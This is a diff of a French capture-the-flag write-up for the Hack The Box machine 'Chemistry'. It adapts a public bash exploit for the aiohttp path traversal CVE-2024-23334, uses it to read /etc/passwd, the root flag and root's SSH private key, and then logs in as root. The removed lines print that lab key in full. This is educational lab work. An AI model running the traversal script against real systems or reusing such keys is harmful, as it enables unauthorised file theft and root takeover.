@@ -13,9 +13,9 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Writeup générique de machine CTF : documentation de la phase d'énumération, exploitation du foothold, escalade de privilèges et capture des flags. Sert de modèle structuré pour rédiger les solutions détaillées"
-description: "Writeup HTB Easy combinant approche pédagogique et analyse technique, avec énumération claire, compréhension de la vulnérabilité et progression structurée jusqu’à l’escalade."
-tags: ["Easy"]
+summary: "Chemistry (HTB Easy ) : RCE via pymatgen puis escalade root via path traversal aiohttp."
+description: "Chemistry (HTB Easy) : RCE via upload CIF (CVE-2024-23346), reverse shell, puis escalade root grâce à un path traversal aiohttp (CVE-2024-23334). Approche méthodique et pédagogique."
+tags: ["Easy","Hack The Box","Web","RCE","Path Traversal","pymatgen","aiohttp","CVE-2024-23346","CVE-2024-23334"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -26,7 +26,7 @@ TocOpen: true
 # --- Cover / images (Page Bundle) ---
 cover:
   image: "image.png"
-  alt: "Chemistry"
+  alt: "Machine Chemistry HTB Easy exploitée via RCE pymatgen puis path traversal aiohttp jusqu’à l’accès root"
   caption: ""
   relative: true
   hidden: false
@@ -37,9 +37,9 @@ cover:
 ctf:
   platform: "Hack The Box"
   machine: "Chemistry"
-  difficulty: "Easy | Medium | Hard"
+  difficulty: "Easy"
   target_ip: "10.129.x.x"
-  skills: ["Enumeration","Web","Privilege Escalation"]
+  skills: ["Enumeration","Web Exploitation","Reverse Shell","Privilege Escalation"]
   time_spent: "2h"
   # vpn_ip: "10.10.14.xx"
   # notes: "Points d'attention…"
@@ -122,9 +122,18 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-- Contexte (source, thème, objectif).
-- Hypothèses initiales (services attendus, techno probable).
-- Objectifs : obtenir `user.txt` puis `root.txt`.
+La machine **Chemistry** de Hack The Box propose un scénario d’exploitation progressif centré sur l’analyse de fichiers scientifiques.
+ Derrière une application web apparemment anodine — un analyseur de fichiers CIF (Crystallographic Information File) — se cache une vulnérabilité critique de type **Remote Code Execution** affectant la bibliothèque Python *pymatgen* (CVE-2024-23346).
+
+Dans ce writeup, tu verras comment :
+
+- exploiter une RCE via upload de fichier CIF,
+- obtenir un reverse shell sur le serveur,
+- pivoter vers un utilisateur valide grâce à l’analyse d’une base SQLite,
+- puis identifier et exploiter un service interne vulnérable à un **path traversal (CVE-2024-23334)** pour compromettre entièrement la machine.
+
+L’enchaînement est logique, méthodique et met en évidence un point essentiel en sécurité offensive :
+ une simple vulnérabilité applicative peut, lorsqu’elle est combinée à une mauvaise isolation des services internes, conduire à une compromission totale du système.
 
 ---
 
@@ -1139,7 +1148,7 @@ Les capabilities identifiées concernent essentiellement des opérations réseau
 - Ce type de configuration est classique.
 - Aucune capability ne permet ici une élévation directe vers `root`.
 
-Tu peux donc écarter cette piste et continuer la recherche.
+Piste non concluante, continue la recherche.
 
 
 
@@ -1244,9 +1253,9 @@ Les binaires identifiés sont standards :
 - composants liés à `snap`, `dbus`, `polkit`
 
 Rien d’inhabituel.
- Aucun binaire manifestement exploitable via GTFOBins.
+Aucun binaire manifestement exploitable via GTFOBins.
 
-On poursuit méthodiquement.
+Rien d’exploitable à ce stade.
 
 ------
 
@@ -1276,9 +1285,11 @@ On observe plusieurs services en écoute :
 Le port 5000 correspond à l’application web initiale et ne constitue pas une nouvelle piste d’escalade.
 
 En revanche, **le service en 127.0.0.1:8080 est uniquement accessible depuis la machine elle-même**.
- Il n’était pas visible lors des scans externes.
+Il n’était pas visible lors des scans externes.
 
 Dans le cadre d’une escalade de privilèges, c’est donc **la seule surface d’attaque réellement nouvelle à analyser**.
+
+**C’est ici que l’escalade commence réellement.**
 
 ### Identification du service en 127.0.0.1:8080
 
@@ -1309,21 +1320,61 @@ Dans un contexte CTF, un service interne en Python accessible uniquement en loca
 
 
 
+### CVE-2024-23334 — Path Traversal dans aiohttp (service interne)
 
+L’en-tête HTTP du service local indique :
 
+Server: Python/3.9 aiohttp/3.9.1
 
+Dans le contexte d’un CTF, identifier une version précise d’un framework web Python est un signal fort.
+ Une recherche ciblée associant *aiohttp 3.9.1* et *path traversal* mène rapidement à :
 
-avec https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh
+CVE-2024-23334 — vulnérabilité de type path traversal affectant la gestion des fichiers statiques dans certaines configurations aiohttp.
 
-voici le script `exploit.sh`proposé :
+Cette faille permet, sous certaines conditions, d’accéder à des fichiers en dehors du répertoire statique exposé par l’application.
 
-```python
+Autrement dit :
+ si le service expose un dossier comme `/static/` ou `/assets/`, il peut être possible de remonter l’arborescence avec `../` pour lire des fichiers sensibles.
+
+#### Adaptation du PoC à la machine Chemistry
+
+Un PoC public est disponible ici :
+ https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh
+
+Le script d’origine cible :
+
+- http://localhost:8081
+- le chemin `/static/`
+
+Or, sur la machine Chemistry :
+
+- le service écoute sur `127.0.0.1:8080`
+- les fichiers statiques sont servis depuis `/assets/`
+
+Tu le vérifies facilement :
+
+```
+rosa@chemistry:~$ curl -s http://127.0.0.1:8080 | grep src
+    <script src="/assets/js/jquery-3.6.0.min.js"></script>
+    <script src="/assets/js/chart.js"></script>
+    <script src="/assets/js/script.js"></script>
+```
+
+Cela confirme que le répertoire statique exposé est `/assets/`, et non `/static/`.
+
+Il est donc nécessaire d’adapter le PoC au contexte réel de la machine.
+
+#### Script d’origine
+
+Le script proposé est le suivant :
+
+```
 #!/bin/bash
 
 url="http://localhost:8081"
 string="../"
 payload="/static/"
-file="etc/passwd" # without the first /
+file="etc/passwd"
 
 for ((i=0; i<15; i++)); do
     payload+="$string"
@@ -1338,29 +1389,30 @@ for ((i=0; i<15; i++)); do
 done
 ```
 
-Le script cible`http://localhost:8081` le point d’entrée du service **aiohttp** et ajoute progressivement des `../` après `/static/` afin de remonter dans l’arborescence du serveur. L’option `--path-as-is` permet d’envoyer le chemin exactement tel qu’il est écrit, sans correction automatique.
+Le principe est simple :
 
-Dès qu’un code HTTP `200` apparaît, cela signifie que tu as réussi à sortir du dossier `/assets/` et à accéder à un fichier sensible comme `/etc/passwd`, confirmant une vulnérabilité de type path traversal.
+- ajouter progressivement des `../`
+- tester l’accès à un fichier sensible (`/etc/passwd`)
+- surveiller le code HTTP
+- afficher le contenu dès qu’un `200` apparaît
 
-Tu sais que ton service **aiohttp** écoute en local sur `http://127.0.0.1:8080` et en inspectant la page avec `curl | grep src`, tu constates que les fichiers statiques sont servis depuis le répertoire `/assets/`.
+L’option `--path-as-is` est essentielle :
+ elle empêche `curl` de normaliser automatiquement le chemin et garantit que la séquence `../` est envoyée telle quelle au serveur.
+
+#### Script adapté à Chemistry
+
+Tu modifies donc :
+
+- le port → `8080`
+- le répertoire statique → `/assets/`
 
 ```bash
-rosa@chemistry:~$ curl -s http://127.0.0.1:8080 | grep src
-    <script src="/assets/js/jquery-3.6.0.min.js"></script>
-    <script src="/assets/js/chart.js"></script>
-    <script src="/assets/js/script.js"></script>
-rosa@chemistry:~$ 
-```
-
-tu modifies alors le script en conséquence
-
-```python
 #!/bin/bash
 
-url="http://127.0.0.1:8080" # modifié
+url="http://127.0.0.1:8080"
 string="../"
-payload="/assets/" # modifié
-file="etc/passwd" # without the first /
+payload="/assets/"
+file="etc/passwd"
 
 for ((i=0; i<15; i++)); do
     payload+="$string"
@@ -1375,7 +1427,9 @@ for ((i=0; i<15; i++)); do
 done
 ```
 
-résultat :
+#### Validation de la vulnérabilité
+
+Exécution :
 
 ```bash
 rosa@chemistry:~$ bash exploit.sh
@@ -1385,6 +1439,11 @@ rosa@chemistry:~$ bash exploit.sh
 	Status code --> 404
 [+] Testing with /assets/../../../etc/passwd
 	Status code --> 200
+```
+
+Puis le contenu de `/etc/passwd` s’affiche.
+
+```bash
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -1424,15 +1483,37 @@ app:x:1001:1001:,,,:/home/app:/bin/bash
 _laurel:x:997:997::/var/log/laurel:/bin/false
 ```
 
+Cela confirme que :
+
+- le service aiohttp interne est vulnérable
+- la restriction au répertoire statique peut être contournée
+- la machine est vulnérable à un path traversal exploitable
+
+Et surtout :
+
+ce service n’était pas accessible depuis l’extérieur.
+
+Il constitue donc **une surface d’attaque interne révélée uniquement après l’obtention d’un shell utilisateur** — ce qui correspond parfaitement à un scénario d’escalade de privilèges.
+
+------
+
 ### flag root.txt
 
-Et, pour être très pragmatique, tu modifies directement la variable cible dans le script pour lire `/root/root.txt`, ce qui te permet d’aller droit à l’essentiel une fois la vulnérabilité validée.
+#### Lecture directe de root.txt
 
-```python
-file="root/root.txt" # without the first /
+La vulnérabilité étant confirmée, tu peux cibler directement des fichiers sensibles.
+
+Dans un contexte CTF, le premier objectif évident est :
+
+`/root/root.txt`
+
+Tu modifies simplement la variable cible dans le script :
+
+```bash
+file="root/root.txt"
 ```
 
-ce qui te donne directement le flage root.txt
+Puis tu relances l’exploit :
 
 ```bash
 bash exploit.sh
@@ -1445,107 +1526,66 @@ bash exploit.sh
 7badxxxxxxxxxxxxxxxxxxxxxxxxba4c
 ```
 
-et avec :
+La lecture du flag root.txt confirme que :
 
-```python
-file="root/.ssh/id_rsa" # without the first /
+- le path traversal permet d’accéder à des fichiers appartenant à root
+- aucune restriction supplémentaire n’est appliquée côté serveur
+- la vulnérabilité impacte l’ensemble du système de fichiers
+
+Cependant, lire un fichier ne signifie pas encore disposer d’un shell root interactif.Tu as accès aux données, mais pas encore au contrôle complet du système.
+
+#### Extraction de la clé privée root
+
+Dans une logique d’escalade complète, il est préférable d’obtenir un accès interactif root.
+
+Une cible naturelle est donc :
+
+`/root/.ssh/id_rsa`
+
+Tu modifies à nouveau la variable :
+
+```bash
+file="root/.ssh/id_rsa"
 ```
 
-**tu obtiens même la clé ssh de l'utilisateur root**
+Exécution :
 
 ```bash
 bash exploit.sh
-[+] Testing with /assets/../root/.ssh/id_rsa
-	Status code --> 404
-[+] Testing with /assets/../../root/.ssh/id_rsa
-	Status code --> 404
 [+] Testing with /assets/../../../root/.ssh/id_rsa
 	Status code --> 200
 -----BEGIN OPENSSH PRIVATE KEY-----
-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
+...
 -----END OPENSSH PRIVATE KEY-----
-
 ```
 
+Cela signifie que :
 
+- la clé privée SSH de root est lisible
+- la protection du dossier /root est totalement contournée
+- l’escalade peut désormais devenir interactive
+
+#### Obtention d’une session root interactive
+
+Tu récupères la clé sur ta machine Kali à l’aide de la recette {{< recette "copier-fichiers-kali" >}}, puis tu la sauvegardes dans un fichier local.
+
+Tu adapte les permissions de la clé :
 
 ```bash
-┌──(kali㉿kali)-[~/chemistry]
-└─$ chmod 600 id_rsa           
-                                                                                
-┌──(kali㉿kali)-[~/chemistry]
-└─$ ssh -i id_rsa root@chemistry.htb                         
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
+chmod 600 id_rsa
+```
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
+Puis tu établis une connexion SSH :
 
- System information as of Wed 25 Feb 2026 10:25:38 AM UTC
+```bash
+ssh -i id_rsa root@chemistry.htb
+```
 
-  System load:           0.0
-  Usage of /:            74.9% of 5.08GB
-  Memory usage:          33%
-  Swap usage:            0%
-  Processes:             231
-  Users logged in:       1
-  IPv4 address for eth0: 10.129.231.170
-  IPv6 address for eth0: dead:beef::250:56ff:fe94:d0aa
+Connexion réussie.
 
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-9 additional security updates can be applied with ESM Apps.
-Learn more about enabling ESM Apps service at https://ubuntu.com/esm
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-Last login: Fri Oct 11 14:06:59 2024
-root@chemistry:~# 
+```bash
+root@chemistry:~# whoami
+root
 root@chemistry:~# pwd
 /root
 root@chemistry:~# ls -l
@@ -1553,17 +1593,40 @@ total 4
 -rw-r----- 1 root root 33 Feb 24 14:37 root.txt
 root@chemistry:~# cat root.txt
 7badxxxxxxxxxxxxxxxxxxxxxxxxba4c
-root@chemistry:~# 
 ```
 
+À ce stade :
 
+- tu disposes d’un accès root complet
+- tu peux interagir librement avec le système
+- l’escalade de privilèges est terminée
+
+**La vulnérabilité CVE-2024-23334, combinée à l’accès utilisateur initial, a donc permis une compromission totale de la machine. Une simple vulnérabilité de path traversal sur un service interne mal isolé suffit ici à compromettre entièrement le système.**
+
+Dans un environnement réel, un service interne mal configuré exposant un répertoire statique peut devenir un vecteur critique d’escalade, même sans accès réseau externe.
 
 ## Conclusion
 
-- Récapitulatif de la chaîne d'attaque (du scan à root).
-- Vulnérabilités exploitées & combinaisons.
-- Conseils de mitigation et détection.
-- Points d'apprentissage personnels.
+La machine **Chemistry** illustre parfaitement comment une vulnérabilité applicative peut servir de point d’entrée vers une compromission complète du système.
+
+Tout commence par une **Remote Code Execution via upload de fichier CIF (CVE-2024-23346)** exploitant la bibliothèque Python *pymatgen*.
+ Cette première faille permet d’obtenir un reverse shell et un accès utilisateur limité.
+
+Mais l’élément déterminant réside ensuite dans l’analyse méthodique du système :
+ l’identification d’un service interne exposé uniquement en local, basé sur **aiohttp 3.9.1**, conduit à l’exploitation d’une seconde vulnérabilité critique — **CVE-2024-23334**, une faille de type path traversal.
+
+Cette combinaison de faiblesses montre une réalité importante en sécurité offensive :
+
+- une RCE initiale ne suffit pas toujours à compromettre totalement une machine,
+- mais une mauvaise isolation des services internes peut transformer une simple lecture de fichier en **compromission root complète**.
+
+Chemistry n’est donc pas seulement un exercice d’exploitation technique ;
+ c’est un excellent rappel qu’en pentest comme en CTF, la clé reste toujours la même :
+
+> énumérer méthodiquement, comprendre l’architecture, puis exploiter intelligemment les points faibles identifiés.
+
+Tu disposes maintenant d’une vue complète du cycle d’attaque :
+ RCE → reverse shell → pivot utilisateur → exploitation d’un service interne → accès root.
 
 ---
 
